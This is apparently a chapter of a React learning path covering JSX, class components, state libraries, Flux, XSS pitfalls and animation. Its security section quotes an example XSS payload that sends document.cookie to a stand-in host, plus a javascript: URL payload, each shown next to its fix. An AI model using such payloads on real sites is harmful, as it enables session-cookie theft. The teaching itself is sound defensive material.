# 06 — Bonus Topics

**In simple words:** These topics show depth. Some are older APIs you will meet in existing codebases (class components, PropTypes, plain Redux). Some are alternatives to Redux. Two are practical skills every senior React developer needs: preventing XSS and animating UI.

[React path home](README.md) · [Previous: Ecosystem Advanced](05-ecosystem-advanced.md) · **React chapter 6 of 6**

---

## 1. React without JSX (`createElement`)

JSX is only syntax. Every JSX element becomes a function call.

~~~js
import { createElement as h } from 'react';

// JSX:  <button className="primary" onClick={buy}>Buy {name}</button>
const el = h('button', { className: 'primary', onClick: buy }, 'Buy ', name);

// Nested
const card = h('article', null,
  h('h3', null, product.name),
  h(PriceTag, { amount: product.price }),          // component: pass the function, not a string
);
~~~

Signature: `createElement(type, props, ...children)`.

- `type`: a string for DOM tags (`'div'`) or a component function/class.
- Returns a **React element**: a plain, immutable object `{ $$typeof, type, key, ref, props }`.
- Since React 17 the **new JSX transform** compiles JSX to `jsx()` / `jsxs()` from `react/jsx-runtime`, so `import React from 'react'` is no longer required in every file. `createElement` still works.

When you might use it: no build step (quick demo, CDN script), libraries that generate elements, or interview questions on "what does JSX compile to?". Helpers like `htm` give JSX-like tagged templates without a build.

---

## 2. Class component definition

~~~tsx
import { Component } from 'react';

type Props = { initial: number };
type State = { count: number };

class Counter extends Component<Props, State> {
  state: State = { count: this.props.initial };

  // Arrow function keeps `this` bound
  increment = () => {
    this.setState((prev) => ({ count: prev.count + 1 }));
  };

  render() {
    return <button onClick={this.increment}>Clicked {this.state.count}</button>;
  }
}
~~~

Key differences from function components:

| | Class | Function |
|---|---|---|
| State | One `this.state` object; `setState` **merges** shallowly | Many `useState` values; setter **replaces** |
| `this` | Must bind handlers (constructor `bind` or arrow class fields) | No `this` |
| Logic reuse | HOCs, render props | Custom hooks |
| Lifecycle | Methods | Effects |
| Error boundaries | Supported | Not supported |
| Captured values | `this.props` always latest (can cause stale/async bugs) | Each render captures its own props |

`setState` is asynchronous/batched; use the updater form when depending on previous state. The second argument is a callback after the update: `this.setState(next, () => {...})`.

`PureComponent` = class with a shallow props/state comparison (like `memo`).

React 19 removed for classes: **string refs**, **legacy context** (`contextTypes`/`getChildContext`), and `propTypes`/`contextTypes` checks.

---

## 3. Class component lifecycle

~~~mermaid
flowchart TB
  subgraph Mount
    A1[constructor] --> A2[static getDerivedStateFromProps] --> A3[render] --> A4[componentDidMount]
  end
  subgraph Update
    B1[static getDerivedStateFromProps] --> B2[shouldComponentUpdate] --> B3[render] --> B4[getSnapshotBeforeUpdate] --> B5[componentDidUpdate]
  end
  subgraph Unmount
    C1[componentWillUnmount]
  end
  subgraph Errors
    D1[static getDerivedStateFromError] --> D2[componentDidCatch]
  end
~~~

| Method | Phase | Use for | Hook equivalent |
|---|---|---|---|
| `constructor(props)` | Render | Initialise state, bind methods | `useState` initialiser |
| `static getDerivedStateFromProps(props, state)` | Render | Rare: update state from props before every render | Compute during render / `key` |
| `shouldComponentUpdate(nextProps, nextState)` | Render | Return `false` to skip rendering | `memo` |
| `render()` | Render | Return UI — must be pure | Function body |
| `getSnapshotBeforeUpdate(prevProps, prevState)` | Pre-commit | Read DOM (e.g. scroll position) before it changes; return value goes to `componentDidUpdate` | None (no hook) |
| `componentDidMount()` | Commit | Subscriptions, fetch, DOM measurement | `useEffect(..., [])` / `useLayoutEffect` |
| `componentDidUpdate(prevProps, prevState, snapshot)` | Commit | React to changes (compare with prev!) | `useEffect(..., [deps])` |
| `componentWillUnmount()` | Commit | Cleanup | Effect cleanup |
| `static getDerivedStateFromError(error)` | Render | Show fallback UI | None |
| `componentDidCatch(error, info)` | Commit | Log errors | None |

~~~tsx
componentDidUpdate(prevProps: Props) {
  if (prevProps.userId !== this.props.userId) {   // ✅ compare to avoid infinite loops
    this.loadUser(this.props.userId);
  }
}
~~~

**Deprecated / unsafe methods** (renamed with `UNSAFE_` prefix in 16.3 because they break with async rendering): `componentWillMount`, `componentWillReceiveProps`, `componentWillUpdate`.

Typical lifecycle bug in classes: forgetting `componentWillUnmount` cleanup, or logic split across `didMount`/`didUpdate`/`willUnmount` for one subscription. Hooks group it in one effect.

---

## 4. Typechecking: PropTypes vs TypeScript

**PropTypes** checked props **at runtime in development** and logged warnings.

~~~js
import PropTypes from 'prop-types';

ProductCard.propTypes = {
  name: PropTypes.string.isRequired,
  price: PropTypes.number,
  tags: PropTypes.arrayOf(PropTypes.string),
};
ProductCard.defaultProps = { price: 0 };
~~~

| | PropTypes | TypeScript |
|---|---|---|
| When it checks | Runtime, development only | Compile time (editor + CI) |
| Covers | Component props only | Everything: props, state, functions, API types |
| Feedback | Console warning when the code runs that path | Error before running |
| Editor autocomplete | No | Yes |
| React 19 | **Checks silently removed** (ignored) | Recommended |

Also in React 19: `defaultProps` for **function** components was removed — use default parameter values: `function ProductCard({ price = 0 })`. (Still supported for classes.)

Runtime validation is still useful at **boundaries** (API responses, form input, `localStorage`): use Zod/Valibot, not PropTypes.

---

## 5. Redux Toolkit

**Redux Toolkit (RTK)** is the official, recommended way to write Redux. Writing Redux "by hand" (as in chapter 4) is considered legacy.

### Differences with pure Redux

| Pure Redux | Redux Toolkit |
|---|---|
| Action type constants + action creators + switch reducer | `createSlice` generates all three |
| Manual immutable spreads | **Immer** lets you write "mutating" code safely |
| `createStore` + `applyMiddleware` + DevTools setup | `configureStore` with good defaults |
| Hand-written loading/error actions for API calls | `createAsyncThunk` or **RTK Query** |
| Easy to mutate state by accident | Dev-mode immutability and serializability checks |

### `createSlice`

~~~ts
import { createSlice, type PayloadAction } from '@reduxjs/toolkit';

type CartState = { items: Record<string, number> };

const cartSlice = createSlice({
  name: 'cart',
  initialState: { items: {} } as CartState,
  reducers: {
    itemAdded(state, action: PayloadAction<string>) {
      state.items[action.payload] = (state.items[action.payload] ?? 0) + 1;   // Immer: safe "mutation"
    },
    itemRemoved(state, action: PayloadAction<string>) {
      delete state.items[action.payload];
    },
    cleared() {
      return { items: {} };            // or return a brand-new state
    },
  },
  selectors: {
    selectCount: (state) => Object.values(state.items).reduce((a, b) => a + b, 0),
  },
});

export const { itemAdded, itemRemoved, cleared } = cartSlice.actions;   // type: 'cart/itemAdded'
export default cartSlice.reducer;
~~~

### `configureStore`

~~~ts
import { configureStore } from '@reduxjs/toolkit';

export const store = configureStore({
  reducer: { cart: cartReducer, [productsApi.reducerPath]: productsApi.reducer },
  middleware: (getDefault) => getDefault().concat(productsApi.middleware),
});

export type RootState = ReturnType<typeof store.getState>;
export type AppDispatch = typeof store.dispatch;
~~~

Defaults: combines slice reducers, adds thunk middleware, dev-only immutability + serializability checks, Redux DevTools.

### Immer

Immer gives you a **draft** copy. You change the draft with normal assignments; Immer records the changes and produces a new immutable state, sharing unchanged parts (structural sharing).

Rules:

- Either **mutate the draft** or **return a new value** — not both.
- `state = something` does nothing (reassigns a local variable). Return the value instead.
- Only works inside `createSlice`/`createReducer` (or `produce`). Outside Immer, mutation is still a bug.

### `createAsyncThunk`

~~~ts
export const fetchOrders = createAsyncThunk('orders/fetch', async (_, { signal }) => {
  const res = await fetch('/api/orders', { signal });
  if (!res.ok) throw new Error(`HTTP ${res.status}`);
  return (await res.json()) as Order[];
});

// in a slice
extraReducers: (builder) => {
  builder
    .addCase(fetchOrders.pending,   (s) => { s.status = 'loading'; })
    .addCase(fetchOrders.fulfilled, (s, a) => { s.status = 'idle'; s.list = a.payload; })
    .addCase(fetchOrders.rejected,  (s, a) => { s.status = 'failed'; s.error = a.error.message; });
}
~~~

### RTK Query APIs

RTK Query is a **data fetching and caching** layer built into RTK. It replaces hand-written thunks + loading flags for server data.

~~~ts
import { createApi, fetchBaseQuery } from '@reduxjs/toolkit/query/react';

export const productsApi = createApi({
  reducerPath: 'productsApi',
  baseQuery: fetchBaseQuery({ baseUrl: '/api' }),
  tagTypes: ['Product'],
  endpoints: (build) => ({
    getProducts: build.query<Product[], void>({
      query: () => 'products',
      providesTags: ['Product'],
    }),
    updatePrice: build.mutation<Product, { id: string; price: number }>({
      query: ({ id, price }) => ({ url: `products/${id}`, method: 'PATCH', body: { price } }),
      invalidatesTags: ['Product'],       // refetch getProducts automatically
    }),
  }),
});

export const { useGetProductsQuery, useUpdatePriceMutation } = productsApi;

// Component
const { data, isLoading, error, refetch } = useGetProductsQuery();
const [updatePrice, { isLoading: saving }] = useUpdatePriceMutation();
~~~

Features: caching and **request deduplication**, automatic re-fetch on tag invalidation, polling, refetch on focus/reconnect, optimistic updates (`onQueryStarted` + `updateQueryData`), code-generation from OpenAPI, unused cache cleanup (`keepUnusedDataFor`).

RTK Query vs TanStack Query: similar features. RTK Query fits apps already on Redux; TanStack Query is store-independent.

---

## 6. MobX

### Main principles

**MobX** makes state **observable** and automatically re-runs anything that used that state when it changes. Its core idea: *anything that can be derived from the application state should be derived automatically*.

Three concepts:

1. **Observable state** — data MobX tracks.
2. **Computed values** — values derived from state, cached until their inputs change.
3. **Reactions** — side effects that run when observed data changes (re-rendering a React component is a reaction).

Changes happen in **actions**.

~~~ts
import { makeAutoObservable } from 'mobx';
import { observer } from 'mobx-react-lite';

class CartStore {
  items: { id: string; price: number; qty: number }[] = [];   // observable

  constructor() { makeAutoObservable(this); }

  get total() {                                             // computed
    return this.items.reduce((sum, i) => sum + i.price * i.qty, 0);
  }

  add(id: string, price: number) {                          // action
    const item = this.items.find((i) => i.id === id);
    if (item) item.qty++;                                   // direct mutation is the MobX way
    else this.items.push({ id, price, qty: 1 });
  }
}

export const cart = new CartStore();

export const CartTotal = observer(() => <p>Total: ₹{cart.total}</p>);   // re-renders only when total changes
~~~

- `observable`, `computed`, `action` can be declared explicitly with `makeObservable`, or inferred with `makeAutoObservable`.
- `observer` tracks which observables a component read during render and re-renders it only when those change — fine-grained by default.
- `reaction`, `autorun`, `when` run side effects (e.g. save to `localStorage`).
- `runInAction` wraps state changes after `await`.

### MobX vs Redux

| | MobX | Redux (RTK) |
|---|---|---|
| Style | Mutable, object-oriented, reactive | Immutable, functional, event-driven |
| Boilerplate | Very low | Low with RTK |
| Re-render precision | Automatic fine-grained tracking | Depends on selectors |
| Predictability / tracing | Less explicit ("magic") | Every change is an action in DevTools |
| Best for | Complex domain models, rich editors, forms | Large teams wanting strict patterns and tooling |

---

## 7. Other state managers

### Zustand

A tiny hook-based store; no provider needed.

~~~ts
import { create } from 'zustand';

type CartStore = { count: number; add: () => void; reset: () => void };

export const useCartStore = create<CartStore>((set) => ({
  count: 0,
  add: () => set((s) => ({ count: s.count + 1 })),
  reset: () => set({ count: 0 }),
}));

// Selector: component re-renders only when `count` changes
const count = useCartStore((s) => s.count);
~~~

Middleware: `persist` (localStorage), `devtools`, `immer`. Works outside React (`useCartStore.getState()`).

### Jotai

**Atomic** state: many small independent atoms; components subscribe to exactly the atoms they use. Derived atoms compute from others. Good when state is many small, interconnected pieces (e.g. a design tool). Similar idea to Recoil (Recoil was archived by Meta in 2025 — do not choose it for new work).

~~~ts
import { atom, useAtom, useAtomValue } from 'jotai';
const qtyAtom = atom(1);
const priceAtom = atom(450);
const totalAtom = atom((get) => get(qtyAtom) * get(priceAtom));   // derived
~~~

### XState

**State machines and statecharts.** You define the **finite states** a feature can be in and the **events** that move between them. Impossible states (e.g. `loading` and `error` at the same time) become impossible by design.

~~~ts
import { createMachine } from 'xstate';

const checkoutMachine = createMachine({
  id: 'checkout',
  initial: 'cart',
  states: {
    cart:       { on: { CHECKOUT: 'address' } },
    address:    { on: { NEXT: 'payment', BACK: 'cart' } },
    payment:    { on: { PAY: 'processing', BACK: 'address' } },
    processing: { on: { SUCCESS: 'done', FAILURE: 'payment' } },
    done:       { type: 'final' },
  },
});
~~~

Good for multi-step flows (checkout, onboarding, media players), visualisable with Stately tools. Overkill for simple toggles.

### Pros/cons compared to Redux and/or each other

| | Redux Toolkit | Zustand | Jotai | MobX | XState |
|---|---|---|---|---|---|
| Model | Single store, actions + reducers | Hook store(s) | Atoms | Observable objects | State machines |
| Bundle size | Medium | Tiny | Tiny | Medium | Medium |
| Boilerplate | Low–medium | Very low | Very low | Low | Medium–high (explicit) |
| DevTools / tracing | Excellent | Via Redux DevTools middleware | DevTools package | MobX tools | Visual inspector |
| Provider required | Yes | No | Optional | No | Optional |
| Learning curve | Medium | Low | Low | Medium (reactivity rules) | High |
| Best at | Large teams, strict conventions, server cache via RTK Query | Simple global state | Fine-grained derived state | Rich domain models | Complex flows with clear states |

Rule of thumb for interviews: **local state first → lift → context for rarely-changing values → server-state library for API data → a client store (Zustand/RTK) only for genuinely global, frequently-updated client state.**

---

## 8. Flux architecture

**Flux** is the pattern Facebook introduced (2014) for one-way data flow in React apps. Redux is a simplified Flux.

~~~mermaid
flowchart LR
  V[View] -- user action --> AC[Action creator]
  AC --> A[Action]
  A --> D[Dispatcher<br/>single, central]
  D --> S1[(Store A)]
  D --> S2[(Store B)]
  S1 -- change event --> V
  S2 -- change event --> V
~~~

| Part | Job |
|---|---|
| **Action** | Object describing what happened (`{ type: 'ADD_TODO', text }`) |
| **Dispatcher** | Single hub that sends every action to every registered store; `waitFor` lets one store wait for another |
| **Store** | Holds state + logic for one domain; updates itself on actions; emits a change event |
| **View** | React components that listen to stores and re-render |

Unidirectional data flow: **Action → Dispatcher → Store → View → (new) Action**. No two-way bindings, so changes are traceable (the problem Facebook hit with MVC and cascading updates, e.g. the unread-message counter bug).

Flux vs Redux:

| | Flux | Redux |
|---|---|---|
| Stores | Many | One |
| Dispatcher | Explicit singleton | None — `store.dispatch` + reducers |
| State update | Stores mutate their own state | Pure reducers return new state |
| Store dependencies | `waitFor` | Reducer composition |

---

## 9. Security: XSS through React props and `dangerouslySetInnerHTML`

React prevents many XSS (cross-site scripting) bugs by **escaping** text: `<p>{comment}</p>` shows `<script>` as text, it does not run it. But some paths bypass this protection. Full attack background: [Module 1 · XSS deep dive](../../05-injection-attacks/xss-deep-dive.md).

> All unsafe examples below are **local learning examples only**.

### 1. `dangerouslySetInnerHTML`

~~~tsx
// ❌ Unsafe: renders user-supplied HTML as HTML
<div dangerouslySetInnerHTML={{ __html: product.description }} />
// description = '<img src=x onerror="fetch(`//evil.test?c=`+document.cookie)">'
~~~

~~~tsx
// ✅ Sanitise with an allow-list first (DOMPurify)
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(product.description, { USE_PROFILES: { html: true } });
<div dangerouslySetInnerHTML={{ __html: clean }} />
~~~

Better still: store Markdown and render it with a library that outputs React elements (e.g. `react-markdown` without raw HTML), so there is no raw HTML at all. Sanitise on the **client right before rendering** (and optionally on the server when storing). Keep DOMPurify updated.

### 2. `javascript:` URLs in `href`/`src` props

React escapes attribute **text**, but a URL that starts with `javascript:` still runs when clicked.

~~~tsx
// ❌ profile.website = "javascript:alert(document.cookie)"
<a href={profile.website}>Website</a>
~~~

~~~tsx
// ✅ Allow only http(s)
function safeUrl(url: string) {
  try {
    const u = new URL(url, window.location.origin);
    return ['http:', 'https:'].includes(u.protocol) ? u.href : '#';
  } catch { return '#'; }
}
<a href={safeUrl(profile.website)} rel="noopener noreferrer" target="_blank">Website</a>
~~~

React logs a warning for `javascript:` URLs and plans to block them, but do not rely on that.

### 3. Spreading untrusted objects as props

~~~tsx
// ❌ attacker-controlled JSON spread onto a DOM element
<div {...userSettings} />   // could include dangerouslySetInnerHTML, href, on* handlers
~~~

Pick known fields explicitly. Never let user data choose prop **names**.

### 4. Other bypasses

- **Refs + `innerHTML`/`insertAdjacentHTML`/`document.write`** — direct DOM writes skip React's escaping.
- **SSR state injection:** `<script>window.__STATE__ = ${JSON.stringify(state)}</script>` — a value containing `</script>` breaks out. Escape `<` (e.g. `serialize-javascript`, or replace `<` with `<`).
- **User-controlled component type:** `createElement(userInput, ...)` lets an attacker choose `'script'`/`'iframe'`.
- **Third-party libraries** that render HTML (rich-text editors, markdown with raw HTML enabled, chart tooltips).
- **`eval` / `new Function`** with user data.
- **Server Functions** as unauthenticated endpoints (see [chapter 5](05-ecosystem-advanced.md#3-server-side-rendering)).

### Defence in depth

- **Content Security Policy** (no `unsafe-inline` scripts, nonces) — [CSP chapter](../../01-browser-and-frontend/content-security-policy.md).
- **Trusted Types** (`require-trusted-types-for 'script'`) makes the browser reject raw strings in `innerHTML` sinks.
- **HttpOnly cookies** for sessions so XSS cannot read them.
- ESLint: `react/no-danger`, `react/jsx-no-script-url`, `react/jsx-no-target-blank`.
- Search the codebase for `dangerouslySetInnerHTML`, `innerHTML`, `href={` with user data during code review.

---

## 10. Animation

### `react-transition-group`

Low-level library that tells you **when** a component is entering or leaving, so you can animate with CSS. It does not animate by itself.

~~~tsx
import { CSSTransition, TransitionGroup } from 'react-transition-group';
import { useRef } from 'react';

function Toast({ message, show }: { message: string; show: boolean }) {
  const nodeRef = useRef<HTMLDivElement>(null);       // avoids deprecated findDOMNode
  return (
    <CSSTransition in={show} timeout={200} classNames="toast" unmountOnExit nodeRef={nodeRef}>
      <div ref={nodeRef} className="toast">{message}</div>
    </CSSTransition>
  );
}
~~~

~~~css
.toast-enter        { opacity: 0; transform: translateY(8px); }
.toast-enter-active { opacity: 1; transform: translateY(0); transition: opacity 200ms, transform 200ms; }
.toast-exit         { opacity: 1; }
.toast-exit-active  { opacity: 0; transition: opacity 200ms; }
~~~

- `Transition` — gives states: `entering`, `entered`, `exiting`, `exited`.
- `CSSTransition` — adds `*-enter`, `*-enter-active`, `*-exit`, `*-exit-active` classes.
- `TransitionGroup` — animates items being added/removed from a list (needs keys).
- `SwitchTransition` — animates swapping one element for another.

The core problem it solves: React removes an element from the DOM **immediately** when you stop rendering it. To animate **exit**, something must keep it mounted until the animation ends.

Maintenance is minimal; many teams now use **Motion** (formerly Framer Motion) with `AnimatePresence` for exit animations, or React Spring for physics-based motion.

### Manual animation

**CSS transitions** — React toggles a class or style; the browser animates.

~~~tsx
<div className={open ? 'drawer open' : 'drawer'} />
~~~

~~~css
.drawer      { transform: translateX(-100%); transition: transform 250ms ease-out; }
.drawer.open { transform: translateX(0); }
~~~

**`requestAnimationFrame` + refs** for frame-by-frame control (charts, counters, drag). Write to `ref.current.style` directly instead of `setState` every frame to avoid 60 re-renders per second.

~~~tsx
useEffect(() => {
  let frame: number;
  const start = performance.now();
  const tick = (now: number) => {
    const progress = Math.min((now - start) / 500, 1);
    boxRef.current!.style.transform = `translateX(${progress * 200}px)`;
    if (progress < 1) frame = requestAnimationFrame(tick);
  };
  frame = requestAnimationFrame(tick);
  return () => cancelAnimationFrame(frame);       // cleanup on unmount
}, []);
~~~

**Web Animations API:** `element.animate([{ opacity: 0 }, { opacity: 1 }], { duration: 200 })` in an effect — no library needed.

**View Transitions API:** `document.startViewTransition(() => flushSync(() => setPage(next)))`. React is adding a `<ViewTransition>` component (experimental/canary at the time of writing).

### `transition` and `transform: translate`

- **`transition`** (CSS) animates a property change over time: `transition: transform 200ms ease-out`.
- **`transform: translate(x, y)`** moves an element **visually** without changing layout.

**Performance rule:** animate only **`transform`** and **`opacity`**. These can run on the compositor (GPU) without recalculating layout. Animating `top`, `left`, `width`, `height` or `margin` triggers layout on every frame and causes jank.

~~~css
/* ❌ layout every frame */
.card:hover { top: -4px; transition: top 150ms; }

/* ✅ compositor-friendly */
.card:hover { transform: translateY(-4px); transition: transform 150ms; }
~~~

Use `will-change: transform` sparingly for elements about to animate.

**FLIP technique** (First, Last, Invert, Play): measure the element's position before and after a layout change, apply an inverse `translate` so it appears not to have moved, then animate the `transform` to zero. Libraries like Motion's `layout` prop do this automatically for list reordering.

### Accessibility

Respect users who turn off motion:

~~~css
@media (prefers-reduced-motion: reduce) {
  * { animation-duration: 0.01ms !important; transition-duration: 0.01ms !important; }
}
~~~

In JS: `window.matchMedia('(prefers-reduced-motion: reduce)').matches`.

---

## Interview questions

1. What does JSX compile to? What changed with the new JSX transform?
2. How does `setState` in a class differ from a `useState` setter?
3. Walk through the class lifecycle for mount, update and unmount. Which methods map to which hooks?
4. Why were `componentWillMount` and friends marked `UNSAFE_`?
5. PropTypes vs TypeScript — what does React 19 do with `propTypes`?
6. What does Redux Toolkit change compared to plain Redux? How does Immer work?
7. What does RTK Query give you over `createAsyncThunk`?
8. Explain MobX observables, computed values and reactions. MobX vs Redux?
9. When would you pick Zustand, Jotai or XState over Redux?
10. Explain Flux. How does Redux differ?
11. How can XSS still happen in a React app? How do you render user HTML safely?
12. Why animate `transform` and `opacity` instead of `top`/`left`?
13. How do you animate a component that is being removed?

## Quick revision

- `createElement(type, props, ...children)`; JSX → `jsx()` since React 17.
- Classes: merged `setState`, bound `this`, lifecycle methods; error boundaries still classes.
- React 19: PropTypes ignored; function `defaultProps` removed; string refs and legacy context removed.
- RTK: `createSlice` + Immer, `configureStore`, `createAsyncThunk`, RTK Query (tags, cache).
- MobX: observable → computed → reaction; `observer` components.
- Zustand (tiny store), Jotai (atoms), XState (state machines).
- Flux: action → dispatcher → stores → view.
- XSS in React: `dangerouslySetInnerHTML`, `javascript:` URLs, prop spreading, DOM writes, SSR state injection.
- Animation: `react-transition-group`/Motion for enter/exit, CSS transitions on `transform`/`opacity`, respect reduced motion.

## References

- [react.dev — createElement](https://react.dev/reference/react/createElement) and [Component (class API)](https://react.dev/reference/react/Component).
- [react.dev — React 19 upgrade guide](https://react.dev/blog/2024/04/25/react-19-upgrade-guide): removed APIs (PropTypes, string refs, legacy context).
- [Redux Toolkit docs](https://redux-toolkit.js.org/) and [RTK Query overview](https://redux-toolkit.js.org/rtk-query/overview).
- [MobX — The gist of MobX](https://mobx.js.org/the-gist-of-mobx.html).
- [Zustand](https://zustand.docs.pmnd.rs/), [Jotai](https://jotai.org/), [XState](https://stately.ai/docs/xstate).
- [Flux (archived) — In-Depth Overview](https://github.com/facebookarchive/flux): the original architecture notes.
- [OWASP — XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) and [DOMPurify](https://github.com/cure53/DOMPurify).
- [react-transition-group docs](https://reactcommunity.org/react-transition-group/) and [MDN — CSS transitions](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_transitions/Using_CSS_transitions).

**Back to:** [React path home](README.md) · **Next in Module 2:** [Backend — Node.js & API Design](../04-backend-nodejs.md).
